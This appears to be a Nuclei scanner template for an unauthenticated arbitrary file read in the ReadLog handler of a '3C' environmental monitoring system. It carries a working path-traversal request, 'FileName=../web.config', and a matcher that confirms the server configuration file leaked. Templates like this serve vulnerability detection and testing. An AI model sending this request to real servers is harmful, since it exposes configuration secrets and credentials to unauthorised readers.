id: 3c-LogService-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 3C科技环境自动监测监控系统ReadLog读取报错日志功能点不受访问控制限制，存在任意文件读取漏洞。未经授权的攻击者可以读取服务器上的任意文件,从而获取系统权限和敏感信息。
  reference:
    - https://github.com/wy876/POC/blob/main/3C%E7%8E%AF%E5%A2%83%E8%87%AA%E5%8A%A8%E7%9B%91%E6%B5%8B%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9FReadLog%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config"

    matchers:
      - type: word
        part: body
        words:
          - '<?xml'
